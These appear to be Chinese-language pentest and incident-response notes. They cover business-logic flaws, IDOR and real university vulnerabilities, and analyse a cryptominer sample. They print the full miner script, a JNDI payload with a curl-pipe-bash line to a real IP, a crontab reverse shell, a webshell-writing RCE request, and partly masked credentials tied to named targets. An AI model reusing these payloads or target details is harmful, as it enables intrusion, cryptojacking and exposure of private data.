### 漏扫|渗透的思路

围绕内网漏洞扫描、Web 应用渗透、远程代码执行（RCE）、敏感文件读取 / 写入、默认口令爆破等行为展开，目标覆盖主流 Web 框架、中间件及数据库服务

1.确定扫描的范围，做前期的信息搜集，找企业的上下游涉及相关的网站系统

2.漏洞扫描与探测，对目标网络进行全方位探测，做协议扫描，存活探测以及漏洞指纹识别【通过响应包特征匹配漏洞】
3.针对主流 Web 框架、中间件的公开漏洞使用网上公开的poc以及工具执行 SQL 注入、RCE、文件操作等攻击测试
4.在获取单台主机权限后，通过系统命令执行、远程协议利用进行内网横向渗透
5.后门植入与持久化，写入 webshell、配置后门账户，系统配置篡改维持访问

```
攻击者主要围绕内网漏洞扫描、Web 应用渗透、远程代码执行（RCE）、敏感文件读取 / 写入、默认口令爆破等行为展开，目标覆盖主流 Web 框架、中间件及数据库服务，具备明显的 “扫描 - 利用 - 横向移动” 渗透特征。以下是具体行为分析：
一、核心攻击行为分类及证据
1. 漏洞扫描与探测（内网渗透前置）
攻击者使用fscan（github.com/shadow1ng/fscan） 这类内网综合扫描工具，对目标网络进行全方位探测，覆盖多协议 / 服务：
协议扫描：SMB（139/445 端口）、RDP（3389）、SSH（22）、FTP（21）、MySQL（3306）、PostgreSQL（5432）、Redis（6379）、Weblogic（7001）等，文档中多次出现github.com/shadow1ng/fscan/Plugins相关模块（如SmbScan、RdpScan、FtpScan、RedisConn）。
存活探测：通过ICMP ping、TCP端口探测判断主机存活，代码中Plugins.RunIcmp2.func1、common.AliveHosts等逻辑用于筛选可攻击目标。
漏洞指纹识别：通过响应包特征匹配漏洞（如 Confluence、Struts2、Solr 的标志性页面），例如response.body.bcontains(b"<title>NVMS-1000</title>")（海康威视设备指纹）、response.body.bcontains(b"responseHeader")（Solr 指纹）。
2. Web 应用漏洞利用（核心攻击手段）
攻击者针对主流 Web 框架、中间件的公开漏洞编写 POC，执行 SQL 注入、RCE、文件操作等攻击，涉及多个高危漏洞（含 CVE 编号）：
攻击类型	涉及漏洞 / 组件	漏洞编号	核心证据（Payload/POC）
SQL 注入	Discuz! v7.2	-	union select {{r1}}*{{r2}},1--+（文档中poc-yaml-discuz-v72-sqli.yml）
Joomla 扩展	CVE-2018-6605	id=1' AND EXTRACTVALUE(22,CONCAT(0x7e,md5({{r1}})))-- X
Confluence	CVE-2021-26084	利用 OGNL 注入执行 SQL 查询，文档中poc-yaml-confluence-cve-2021-26084
Ecshop 登录页	-	user=admin&password=admin 配合 SQL 注入探测（poc-yaml-ecshop-login-sqli）
远程代码执行（RCE）	Struts2	S2-045/S2-057	OGNL 注入 Payload：%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}
Weblogic	CVE-2019-2729	访问/wls-wsat/CoordinatorPortType执行 SOAP 协议 RCE（poc-yaml-weblogic-cve-2019-2729-1）
Confluence	CVE-2021-26084	通过/pages/createpage-entervariables.action注入命令，执行md5({{rand}})验证 RCE 成功
Supervisor	CVE-2017-11610	未授权 RCE，调用xmlrpc接口执行命令（poc-yaml-supervisord-cve-2017-11610）
Flink	CVE-2020-17519	未授权上传 JAR 包执行代码（https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519）
文件读取 / 写入	Laravel	日志泄露	读取/storage/logs/laravel.log获取敏感信息（poc-yaml-laravel-improper-webdir）
Seeyon OA	CNVD-2020-62422	读取/etc/passwd、/yyoa/ext/https/getSessionList.jsp（poc-yaml-seeyon-cnvd-2020-62422-readfile）
任意文件写入	-	写入 webshell：echo "<?php echo md5({{r1}});unlink(__FILE__);?>" >> /usr/www/{{r1}}.php
默认口令爆破	Apache Ambari	-	尝试admin/admin默认口令（poc-yaml-apache-ambari-default-password）
Hikvision 对讲系统	-	利用默认凭证登录（poc-yaml-hikvision-intercom-service-default-password）
3. 系统权限获取与横向移动
攻击者在获取单台主机权限后，通过系统命令执行、远程协议利用进行内网横向渗透：
反弹 shell：写入定时任务反弹 shell，Payload：set xx "\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\n"（通过crontab执行，目标为 Linux 系统）。
SMB 协议利用：通过github.com/hirochachacha/go-smb2库调用 SMB 协议，尝试NTLM认证爆破、读取共享文件（文档中smb2Grooms、NegotiateSMBv1Data2等模块）。
RDP 协议攻击：通过github.com/tomatome/grdp库操作 RDP 协议，可能尝试暴力破解或利用 RDP 漏洞（如 CVE-2019-0708）获取远程桌面权限。
数据库横向：针对 MySQL、PostgreSQL 执行xp_cmdshell（Windows）或system()（Linux）命令，通过数据库权限提升至系统权限。
4. 后门植入与持久化
攻击者通过写入 webshell、配置后门账户维持访问：
Webshell 植入：在 Web 目录写入 PHP 后门（如/usr/www/{{r1}}.php），代码包含md5({{r1}})验证逻辑，避免被轻易发现。
后门账户：尝试通过useradd命令创建隐藏账户（文档中未直接出现，但存在/etc/passwd读取行为，推测用于验证账户创建结果）。
配置文件篡改：修改laravel、thinkphp等框架的配置文件，添加后门路由（如/index.php?s=/Index/\think\app/invokefunction）。
二、攻击工具与技术特征
核心工具：
fscan：内网扫描工具，负责存活探测、漏洞指纹识别、多协议爆破（文档中github.com/shadow1ng/fscan相关代码占比极高）。
grdp：RDP 协议客户端库，用于远程桌面连接与攻击（github.com/tomatome/grdp）。
go-smb2：SMB2 协议库，用于 Windows 文件共享访问、NTLM 认证（github.com/hirochachacha/go-smb2）。
POC 框架：基于 YAML 编写 POC（如poc-yaml-xxx），支持批量漏洞验证。
技术偏好：
优先攻击未授权访问、默认口令、公开 CVE 漏洞（无需复杂绕过，攻击成本低）。
针对Java 生态组件（Weblogic、Struts2、Confluence）和PHP 框架（ThinkPHP、Laravel、Discuz）的漏洞利用最多，这类组件在企业环境中部署广泛。
采用 **“验证型 Payload”**（如md5({{rand}})、expr {{r1}} + {{r2}}）先确认漏洞存在，再执行命令，降低被防御设备拦截的概率。
三、攻击目标范围
攻击者针对的目标覆盖企业内网常见系统 / 组件，具体包括：
Web 应用：Jenkins、Struts2、Solr、Weblogic、Confluence、Joomla、Drupal、ThinkPHP、Laravel、Discuz、Ecshop。
数据库 / 中间件：MySQL、PostgreSQL、Redis、Apache Ambari、Supervisor、Flink。
操作系统：Windows Server（2003/2008）、Linux（CentOS/Ubuntu，通过/etc/passwd、crontab判断）。
设备：海康威视监控设备（NVMS-1000）、H3C SecPath 防火墙（poc-yaml-h3c-secparh-any-user-login）。
```

### 验证码绕过

BP配合插件，用BP拦截数据包流量后使用插件模块，插件配置好外接的验证码识别接口或者在线网站对验证码进行爆破

### 支付逻辑漏洞

商家的充值页面，开发是在前端判断数字，然后他们用的又是第三方充值，第三方一般只支持到分，但是他们的页面又支持充值更小的数字，然后问题就是如果充值到比分还小的单位，比如你充值0.019，那么跳转到第三方之后由于第三方只到分就只需要支付0.1元，但是回来之后前端又把9四舍五入，最后就变成了0.2元，所以最后就实现了充1元变两元的效果

### 并发提前全签到逻辑漏洞

很简单，两个逻辑
先是限制每天只能7点到9点签到，但是他们的代码逻辑是读取用户设备的时间，改一下设备时间直接就可以签到了，这是第一个漏洞

然后第二个漏洞是商家限制每天只能签到一次，但他们的逻辑是一天基于时间限制这个用户只能发这一次数据包的，那就直接改数据包，然后并发一下在同一个时间一下把所有天全签到了
然
这是第二个漏洞

### 会员签约验证逻辑漏洞

*连续包月存在支付漏洞.docx*
一开始测的时候是发现那个网站可以低价购买会员，但是需要签约，每个用户只能用一次
然后如果同时开多个页面同时让这个用户一下签多个约就会告你无法重复签约
然后再测一下，同时用这个用户打开多个签约页面，一个签约完后取消签约，此时再换到另一个页面签，发现签约成功
然后事后看他们的源码发现他们的逻辑是服务器校验了同一新用户不能同时多次低价签约如果用户签约了后续不给他弹这个页面了，但是用户可以同时发起的多个支付签约页面的请求，然后解约后再次签约的情况，最后就导致了这个漏洞

### 政企政务网的未授权访问导致的敏感信息泄露漏洞

攻击者访问下面的接口
http://ezs.xxx.com:8020/v2/api-docs

http://ezs.xxx.com:8020/v3/api-docs
拿到了网站的配置信息

### 恶意样本分析

样本源码

```
C:\Users\19746>curl -s -L http://46.8.231.224/scripts/4thepool_miner.sh
#!/bin/bash

# 4thePool Mining Setup Script
VERSION="3.0"

# Define colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Logging function
log() {
    local level=$1
    local message=$2
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")

    case "$level" in
        "INFO")
            echo -e "${GREEN}[INFO]${NC} $timestamp - $message"
            ;;
        "WARN")
            echo -e "${YELLOW}[WARN]${NC} $timestamp - $message"
            ;;
        "ERROR")
            echo -e "${RED}[ERROR]${NC} $timestamp - $message"
            ;;
        *)
            echo -e "$timestamp - $message"
            ;;
    esac
}

# Error handling
handle_error() {
    local exit_code=$1
    local error_message=$2

    log "ERROR" "$error_message"
    exit $exit_code
}

# Optional dependency check
check_dependencies() {
    log "INFO" "Checking for required tools..."

    local required_tools=("curl" "wget" "tar" "grep" "awk" "sed")
    local missing_tools=()

    for tool in "${required_tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            missing_tools+=($tool)
        fi
    done

    if [ ${#missing_tools[@]} -ne 0 ]; then
        log "WARN" "Missing required tools: ${missing_tools[*]}"
        log "WARN" "Please install these tools manually if possible."
        log "WARN" "Continuing anyway, but the script might fail."
    else
        log "INFO" "All dependencies are installed."
    fi
}

# Check and configure DNS with more robustness
check_dns() {
    log "INFO" "Checking DNS connectivity..."
    local dns_servers=("8.8.8.8" "1.1.1.1" "208.67.222.222" "9.9.9.9")
    local dns_found=false
    local backup_created=false

    # Backup existing resolv.conf (only once)
    if [ -f /etc/resolv.conf ] && [ "$backup_created" = false ] && [ -w /etc/resolv.conf ]; then
        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%Y%m%d%H%M%S)
        backup_created=true
        log "INFO" "Backup of resolv.conf created."
    fi

    for dns in "${dns_servers[@]}"; do
        log "INFO" "Testing DNS server $dns..."
        if ping -c 2 -W 2 $dns &>/dev/null; then
            log "INFO" "DNS connectivity verified using $dns."

            # Check if we can modify resolv.conf
            if [ -w /etc/resolv.conf ] || sudo -n true 2>/dev/null; then
                log "INFO" "Setting $dns as primary DNS server..."
                if sudo -n true 2>/dev/null; then
                    echo "nameserver $dns" | sudo tee /etc/resolv.conf >/dev/null
                else
                    echo "nameserver $dns" > /etc/resolv.conf
                fi
                dns_found=true
                break
            else
                log "WARN" "No permission to modify /etc/resolv.conf, keeping current configuration."
                dns_found=true
                break
            fi
        fi
    done

    if [ "$dns_found" = false ]; then
        log "ERROR" "No DNS connectivity detected."
        return 1
    fi

    # Test name resolution to confirm DNS
    if host 4thepool.lol &>/dev/null || nslookup 4thepool.lol &>/dev/null || dig 4thepool.lol &>/dev/null; then
        log "INFO" "Name resolution working correctly."
    else
        log "WARN" "Name resolution still has issues. Continuing anyway..."
    fi

    return 0
}

# Improved download with retry and timeout
download_with_retry() {
    local url=$1
    local output=$2
    local max_retries=3
    local retry_count=0
    local timeout=30

    while [ $retry_count -lt $max_retries ]; do
        log "INFO" "Downloading $url (attempt $((retry_count+1))/$max_retries)..."

        if command -v curl &>/dev/null; then
            if curl --connect-timeout $timeout -L "$url" -o "$output" 2>/dev/null; then
                log "INFO" "Download completed successfully."
                return 0
            fi
        elif command -v wget &>/dev/null; then
            if wget --timeout=$timeout -q "$url" -O "$output" 2>/dev/null; then
                log "INFO" "Download completed successfully."
                return 0
            fi
        else
            handle_error 1 "No download tool (curl/wget) available."
        fi

        ((retry_count++))
        log "WARN" "Download failed. Checking connectivity..."

        if [ $retry_count -eq 1 ]; then
            check_dns
        fi

        sleep $((retry_count * 2))
        log "INFO" "Retrying in $((retry_count * 2)) seconds..."
    done

    log "ERROR" "Download failed after $max_retries attempts."
    return 1
}

# Check system resources
check_system_resources() {
    log "INFO" "Checking system resources..."

    CPU_THREADS=$(nproc)
    MEM_TOTAL=$(free -m | awk '/^Mem:/{print $2}')

    log "INFO" "Detected $CPU_THREADS CPU threads and ${MEM_TOTAL}MB RAM."

    # Use fewer threads on systems with limited resources
    if [ $CPU_THREADS -gt 2 ] && [ $MEM_TOTAL -lt 2000 ]; then
        MINING_THREADS=$((CPU_THREADS - 1))
        log "WARN" "Low memory detected. Using $MINING_THREADS threads for mining."
    else
        MINING_THREADS=$CPU_THREADS
        log "INFO" "Using all $MINING_THREADS threads for mining."
    fi

    # Calculate estimated hashrate based on threads
    EXP_HASHRATE=$((MINING_THREADS * 700 / 1000))
    log "INFO" "Estimated hashrate: ${EXP_HASHRATE}KH/s"

    return 0
}

# Enhanced cleanup of old services and directories
cleanup_old_services() {
    log "INFO" "Cleaning up previous installations..."

    # Services to check and remove
    local services=("c3pool_miner" "moneroocean_miner" "4thepool_miner")

    for service in "${services[@]}"; do
        if systemctl list-unit-files 2>/dev/null | grep -q "$service.service"; then
            log "INFO" "Stopping and removing $service service..."
            if sudo -n true 2>/dev/null; then
                sudo systemctl stop "$service.service" 2>/dev/null
                sudo systemctl disable "$service.service" 2>/dev/null
                sudo rm -f "/etc/systemd/system/$service.service"
            else
                log "WARN" "No sudo access. Unable to remove system service: $service"
            fi
        fi
    done

    if sudo -n true 2>/dev/null; then
        sudo systemctl daemon-reload 2>/dev/null
    fi

    # Directories to remove
    local directories=("$HOME/c3pool" "$HOME/moneroocean" "$HOME/4thepool")

    for dir in "${directories[@]}"; do
        if [ -d "$dir" ]; then
            log "INFO" "Removing directory $dir..."
            rm -rf "$dir"
        fi
    done

    # Kill xmrig processes more safely
    if pgrep -x "xmrig" >/dev/null; then
        log "INFO" "Terminating existing xmrig processes..."
        pkill -15 xmrig 2>/dev/null
        sleep 2
        # Force kill after trying to terminate normally
        if pgrep -x "xmrig" >/dev/null; then
            pkill -9 xmrig 2>/dev/null
        fi
    fi

    log "INFO" "Cleanup completed."
    return 0
}

# Configure the miner
configure_miner() {
    log "INFO" "Configuring miner..."

    # Generate unique worker identifier
    local HOSTNAME=$(hostname | sed 's/[^a-zA-Z0-9]/_/g')
    if [ "$HOSTNAME" == "localhost" ] || [ -z "$HOSTNAME" ]; then
        HOSTNAME=$(ip route get 1 | awk '{print $NF}' 2>/dev/null || echo "worker")
        # If still no valid hostname, generate a random one
        if [ -z "$HOSTNAME" ] || [ "$HOSTNAME" == "localhost" ]; then
            HOSTNAME="worker_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"
        fi
    fi

    log "INFO" "Worker ID: $HOSTNAME"

    # Static port
    PORT=3333
    log "INFO" "Using static port: $PORT"

    # JSON config file with optimized values
    local CONFIG_FILE="$HOME/4thepool/config.json"

    # Backup original configuration
    if [ -f "$CONFIG_FILE" ]; then
        cp "$CONFIG_FILE" "${CONFIG_FILE}.bak"
    fi

    # Apply settings
    sed -i "s#\"url\":.*#\"url\": \"auto.4thepool.lol:$PORT\",#" "$CONFIG_FILE"
    sed -i "s#\"user\":.*#\"user\": \"$WALLET\",#" "$CONFIG_FILE"
    sed -i "s#\"pass\":.*#\"pass\": \"$HOSTNAME\",#" "$CONFIG_FILE"

    # Configure thread count
    sed -i "s/\"cpu\": {/\"cpu\": {\n        \"enabled\": true,\n        \"priority\": 5,\n        \"threads\": $MINING_THREADS,/" "$CONFIG_FILE"

    # Enable optimized algorithms
    sed -i 's/"rx": {/"rx": {\n            "1gb-pages": true,\n            "rdmsr": true,/' "$CONFIG_FILE"

    # Other optimizations
    sed -i 's/"donate-level": [0-9]*,/"donate-level": 1,/' "$CONFIG_FILE"
    sed -i 's/"print-time": [0-9]*,/"print-time": 60,/' "$CONFIG_FILE"

    log "INFO" "Miner configuration completed."
    return 0
}

# Create and start the service
setup_service() {
    log "INFO" "Setting up startup service..."

    # Check if we have passwordless sudo permission
    if sudo -n true 2>/dev/null; then
        log "INFO" "Configuring systemd service..."
        cat <<EOL | sudo tee /etc/systemd/system/4thepool_miner.service >/dev/null
[Unit]
Description=4thePool Miner Service
After=network.target

[Service]
Type=simple
User=$(whoami)
ExecStart=$HOME/4thepool/xmrig --config=$HOME/4thepool/config.json
Restart=always
RestartSec=10
Nice=10
CPUWeight=50

[Install]
WantedBy=multi-user.target
EOL

        sudo systemctl daemon-reload
        sudo systemctl enable 4thepool_miner.service
        sudo systemctl start 4thepool_miner.service

        log "INFO" "Systemd service configured and started."
        log "INFO" "To check status: sudo systemctl status 4thepool_miner.service"
        log "INFO" "To view logs: sudo journalctl -u 4thepool_miner.service -f"
    else
        log "WARN" "No sudo permission. Adding to user startup..."

        # Add to crontab to restart on reboot
        (crontab -l 2>/dev/null | grep -v "4thepool/xmrig"; echo "@reboot $HOME/4thepool/xmrig --config=$HOME/4thepool/config.json >/dev/null 2>&1") | crontab -

        # Add to .profile if not already present
        if ! grep -q "4thepool/xmrig" "$HOME/.profile" 2>/dev/null; then
            echo "nohup $HOME/4thepool/xmrig --config=$HOME/4thepool/config.json >/dev/null 2>&1 &" >> "$HOME/.profile"
        fi

        # Start the miner now
        nohup "$HOME/4thepool/xmrig" --config="$HOME/4thepool/config.json" >/dev/null 2>&1 &

        log "INFO" "Miner started in background and configured to start automatically."
    fi

    return 0
}

# Main function
main() {
    clear
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}    4thePool Mining Setup Script v$VERSION    ${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "Report issues to: support@4thepool.com"
    echo

    # Root user check
    if [ "$(id -u)" == "0" ]; then
        log "WARN" "Not recommended to run as root! Continuing anyway..."
        sleep 2
    fi

    # Optional dependency check
    if [ "$CHECK_DEPENDENCIES" == "true" ]; then
        check_dependencies
    fi

    # HOME configuration
    if [ -z "$HOME" ]; then
        export HOME=/tmp
        log "WARN" "HOME not set, using /tmp as default directory"
    elif [ ! -d "$HOME" ]; then
        handle_error 1 "Invalid HOME directory: $HOME"
    fi

    # Fixed wallet (replace with your wallet)
    WALLET="486xqw7ysXdKw7RkVzT5tdSiDtE6soxUdYaGaGE1GoaCdvBF7rVg5oMXL9pFx3rB1WUCZrJvd6AHMFWipeYt5eFNUx9pmPD"

    # Wallet verification
    WALLET_BASE=$(echo "$WALLET" | cut -f1 -d".")
    if [ ${#WALLET_BASE} -ne 106 ] && [ ${#WALLET_BASE} -ne 95 ]; then
        handle_error 1 "Invalid wallet address. Length: ${#WALLET_BASE}, Expected: 95 or 106"
    fi

    # Check system resources
    check_system_resources

    # Clean up old services and directories
    cleanup_old_services

    # Confirm installation
    log "INFO" "Installation will begin in 5 seconds... Press Ctrl+C to cancel"
    sleep 5

    # Create directory
    mkdir -p "$HOME/4thepool"

    # Download miner
    log "INFO" "Downloading XMRig..."
    if ! download_with_retry "http://46.8.231.224/scripts/xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
        handle_error 2 "Failed to download miner. Check your connection and try again."
    fi

    # Extraction
    log "INFO" "Unpacking files..."
    if ! tar xf /tmp/xmrig.tar.gz -C "$HOME/4thepool"; then
        handle_error 3 "Failed to extract files."
    fi
    rm -f /tmp/xmrig.tar.gz

    # Correct permissions
    chmod +x "$HOME/4thepool/xmrig"

    # Configure miner
    configure_miner

    # Setup service
    setup_service

    # Finalization
    echo -e "${GREEN}========================================${NC}"
    log "INFO" "Installation completed successfully!"
    log "INFO" "Miner configured to use $MINING_THREADS threads"
    log "INFO" "Estimated hashrate: ${EXP_HASHRATE}KH/s"
    log "INFO" "Using static port: 3333"
    log "INFO" "Note: Monitor your system's CPU usage!"
    echo -e "${GREEN}========================================${NC}"

    return 0
}

# Optional dependencies check flag (set to "true" to enable)
CHECK_DEPENDENCIES="false"

# Run main script
main "$@"
exit $?
```

直接丢给ai还是放到沙盒里还是我看了下代码逻辑，反正就是提取出来有效的攻击载荷

```
xxxxxxxxxx ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
```

就是用了一些字符做混淆的jndi注入，然后直接对对载荷数据进行解密结果，最后就拿到攻击的命令

```
export HOME=/tmp; curl -s -L http://46.8.231.224/scripts/4thepool_miner.sh | bash -s; wget -qO- http://46.8.231.224/scripts/4thepool_miner.sh | bash -s
```

就很明显是外联一个ip然后后门连接，然后就是追踪那个ip做溯源

### 垂直越权
（中国电信）某政企监管系统平台

漏洞url：https://47.111.13.153:8010/login 

登录页面做指纹识别发现有VUE框架，检查一下js结合ai简单做下js逆向检索，发现app.bf2b1746.js的代码中找到一个注册功能接口
填写信息补上验证码后注册了一个账户然后直接就可以登录进后台
进了后台以后点击刷新个人信息的功能时抓包，发现第三个包的回显包中存在用户的id，直接修改uid为admin，最后发现直接返回了系统管理员的信息
然后再拿拿到的系统管理员的数据替换发送的请求包最后直接就进入了管理员的后台页面

### 论坛越权用户遍历

用一个账号登录该论坛时有个修改文章的功能，抓包可以修改里面的loginUuid和viewpointId 参数，把它们换成别的用户的uid 和 文章ID就可以越权修改

### 视频会议越权撤回

就是一个视频会议的软件，直播的时候可以发评论，发评论时抓包可以看到一个参数comment_id，点击回复别人的评论时抓包可以看到别人的comment_id，然后撤回消息时把数据包中的comment_id换成别人的就可以了

### 上海某大学越权

一堆接口没有做访问限制
`https://xxxcn/user/index#/data_subject`
查看整体数据

`https://xxx.cn/user/index#/yxkh_yxbq`

院校级标签可进行增删改操作

### 上海某大学文件读取漏洞

域名xxx.ecnu.edu.cn有文件读取功能，攻击者读取域名中的host文件，攻击成功后上传webshell，代码审计后发现发现源码逻辑有问题，仅检测非空而不进行过滤

### 上海某大学文件上传漏洞

域名www.xxxx.ecnu.edu.cn的功能接口/api/file/upload进行恶意文件上传漏洞,上传图片马

### shiro721 padding oracle
www.fair.xxxxx.edu.cn

```上海某大学
Cookie: rememberMe=u23qyheWw0pOUuKEqlOynslqG2wmOhXXDws/yRJP/Js9lKg3A+jODDcyX5m1Xf/IkR+XHqK4fNvruZW1lIdSpShArHtFw5VJecfxRUTADByU5AQPIw/nMV6kPxdLbGQHrLoycjO+CU7B2hlffpFbqCXtK1/FM4OxbVud5GbmkaLpzojGkXvGxAkaiUMlJeF5
```

### 上海某大学信息泄露高危漏洞
202.120.83.130【https://xxxx.ecnu.edu.cn/6】溯源

```
       https://xxxx.ecnu.edu.cn             172.xx.4.32

​      xxxx.ecnu.edu.cn            对应           202.xxx.83.130       

​     查询这个域名，发现流量流向202.xxx.92.21【nhttps.ecnu.edu.cn   代理】
```

```
沟通了一下这个接口的具体情况：
1.接口用作干什么？    用于去查询教师的相关信息
2.接口在哪里被调用的，是怎么被调用的（用户在哪里可以使用这个接口）？     
在研究生院的网页中，选择教师遴选时就会调用该接口
3.接口有做什么限制吗？（比如直接访问这个接口会怎么？会验证访问者的身份是否为本账户吗？）
会对访问者的身份进行验证，访问者需要先通过SSO.ecnu的身份认证，然后再去验证该身份是否在研究生系统中有无身份，如果有，则让用户选择该身份然后进入
4.为什么我们直接访问这个api会显示登录认证失败，页面会显示一个登录页面的url
https://portal1.ecnu.edu.cn/cas/login?service=https%3A%2F%2Fyjsjy.ecnu.edu.cn%2Fyjsy-ui%2Flogin%2Fchoose-identity.htm，访问后会跳转到一个sso.ecnu的登录页面，我们用一个管理员身份登录后为什么在https://yjsjy.ecnu.edu.cn/yjsy-ui/login/choose-identity.html中的请选择权限并进入研究生系统（新）没有权限） 
因为我们用的是陈嘉阳的账户，他在SSO系统中是管理员身份，但在研究生系统中无身份，因此在研究生系统选择身份页面没有选项
5.查一下接口的调用记录可以做到吗？
可以做到，但需要开发来到现场进行查看，所以需要先去测一下这个接口恶意利用的详细情况，是否如猜测一样管理员权限可以查询所有用户信息而普通账户身份不可以，如果是，则说明管理员账户泄露，需要上机排查是哪一个账户泄露
```

攻击payload:

攻击者登录同时拥有SSO以及研究生系统身份的账号时，即可通过访问该payload拿到任意用户敏感信息

https://xxxx.ecnu.edu.cn/yjsy/api/xw/staff/20100054【xxx院系统用户账户】

### 上海某大学校友会命令执行

 202.120.85.159

27.xxxxx.141  - 》   202.xxx.92.60    - 》  202.xxxx.92.124     -》   202.xxx.85.159  命令执行

​                                                                                                                     校友会

​                                     山石WAF                               路由                          已隔离

后续追踪相关ip，相关如下：

202.xxxx.92.60     扫描   172.xxx.4.51

 ### 上海某大学api接口泄露

jiaotong.ecnu.edu.cn存在大量访问api接口流量，手工测试一下，发现在没有登录情况的情况下访问该api接口可以直接拿到用户的敏感信息，经过测试，同级身份用户可以通过该接口水平越权访问进行数字遍历拿到大量同级用户敏感信息

### 上海某大学jndi注入漏洞

```
192.168.1.176进行疑似JNI类攻击，详细行为为通过 URL http://192.xxxx.1.176:8080/WF_MSG/loginAction_getCheckCodeImg.action 发起 3 次攻击，利用 OGNL 表达式注入漏洞 执行恶意代码，尝试加载名为 fontmanager 的二进制库，目标路径指向 WF_MSG 应用的验证码接口。
```

### 上海某大学目录信息泄露漏洞
49.xxxxx.252/icons目录启用了自动目录列表功能，导致攻击者可以通过访问该目录获取目录列表下的所有文件名以及文件内容

### 上海某大学配置文件信息泄露

xxxx.ecnu.edu.cn.//WEB-INF/web.xml

J2EE WEB.XML配置文件信息泄露

### 上海某大学POST弱口令

```
xxxr.ecnu.edu.cn（url=cxxxxer.ecnu.edu.cn/xxxxer/index/wjxx/login）进行post弱口令登录
账号为（userCode=10220xxx021）10xxxxxxxxx21，密码为（userPassword=%E5%8Fxxxx80%9D%E7%9D%BF）xx佳。


xxxxxxr.ecnu.edu.cn（url=career.ecnu.edu.cn/xxxxxr/index/wjxx/login）进行post弱口令登录，账号（userCode）102xxxxx19，密码（userPassword=%E5%8F%B6xxxxxx9D%BF）叶xx。
```

### -上海某大学研究系统信息泄露[特别重大成果]

```
1.事件概述：
在xxxx.ecnu.edu.cn【研究生院官网】的功能“导师遴选”中，用户点击该功能会跳转到域名xxxxx.ecnu.edu.cn 【研究生教育系统】
当用户访问研究生教育系统时，
该系统会调用xxxxx.ecnu.edu.cn/yjsy/api/xw/staff这个api接口进而读取导师的信息
该接口会对用户的身份进行验证，先验证是否为统一SSO系统身份用户，再验证是否为研究生院身份用户
正常来说，该接口被用户访问时，最多只允许用户读取自身的信息，但该接口在对用户身份认证后【确定为研究生教育系统用户】，对其的权限控制不完善，导致只要攻击者成功拿到研究生教育系统的任意身份用户并成功登录研究生系统页面，即可通过
构造payload:
xxxxx.ecnu.edu.cn/yjsy/api/xw/staff/用户账户 
来读取任意用户的敏感信息
2.验证参考：
当使用拥有SSO系统管理员身份，但没有研究生院系统身份访问该接口时，会显示身份效验失败
当使用拥有SSO系统身份，同时拥有研究生院系统普通用户导师身份访问该接口时，可以读取任意用户敏感信息
当使用拥有SSO系统身份，同时拥有研究生院系统管理员用户导师身份访问该接口时，可以读取任意用户敏感信息
```

### -上海某大学远程RCE[特别重大成果]

PHP代码执行攻击

请求头

```
GET /?p=20&test=}{pboot:if(("var_"."dump")(("file"."_put_contents")("./static/uploadxxxxxxlogin2.php/",("hex2bi"."n")("3c3f70687020244f30304f4f303d75726c6465636f646528222537382533342536332536462532462537302xxxxxxxx364525363425373325373425363525364525364425373125373625373522293b244f30304f304f3d244f30304f4f305b34345d2e244f30304f4f305b32335d2e244f30304f4f305b3338xxxxx7777772e73756e73746f6e656a65742e636f6d2532466373732532463430342e7a697022293b244f30304f4f323d2234222e2230222e244f30304f4f305b315d2e2234222e222e222e227a222e244f30304f4f305b33305d2e2270223b244f30304f304f28244f30304f4f312c244f30304f4f32293b696e636c75646520244f30304f4f323b3f3e"))))}{/pboot:if} HTTP/1.1
1.Accept-Encoding: identity
2.Host: iexchange.ecnu.edu.cn
3.User-Agent: Python-urllib/3.10
4.Connection: close
```

响应头

```
6.HTTP/1.1 200 OK
7.Content-Type: text/html
8.Last-Modified: Wed, 29 Apr 2015 09:54:31 GMT
9.Accept-Ranges: bytes
10.ETag: "cba9737d6282d01:0"
11.X-Content-Type-Options: nosniff
12.Date: Thu, 03 Jul 2025 09:54:22 GMT
13.Connection: close
14.Content-Length: 287
Set-Cookie: cookie=!NBDaP2kn13RbANhntQPUhGHO9v7kysxoxkgJQFQo5po8PC6lNpBKy2LZR+8C3J6hVy1/TYARbjkkOOA=; path=/; Httponly
```

流量行为分析

```
可以参考ai分析：https://www.doubao.com/thread/w17d5710bac9d38cc
攻击者通过GET传参，传入恶意参数P，以及TSET，值具体为一串加密后的命令密文
命令进行的具体操作为：
1.使用pboot:if标签包裹恶意 PHP 代码，通过模板引擎执行命令：使用file_put_contents函数向服务器写入文件，向./static/upload/image/login2.php文件中写入恶意代码
2.恶意代码的具体行为有：解码并拼接恶意函数名；从远程服务器上www.sunstonejet.com下载404.zip文件；将该文件保存在本地路径./static/upload/image/4044..zip[具体不一定，攻击者是通过动态字符拼接来写文件名的，可能为别的，如404.zfp.php；包含并执行该文件
3.具体代码为：

$000000=urldecode(解码后的字符串);
$000000=$000000[44].$000000[23].$000000[38].$000000[7];
11	即取解码后字符串的第44、23、38、7个字符拼接	
$000001= urldecod("http%3A%2F%2Fwww.sunstonejet.com%2Fcss%2F404.zip");//远程恶意文件URL
$000002=	"4".	"	0	"	.$000000[1].'	$000000[30]."p";	71	拼接目标文件名	
$000000($000001,$000002);//调用拼接的函数下载文件
include	$000002;//包含并执行下载的文件!
```

### - 人脸系统靶标小程序信息高危[特别重大成果]

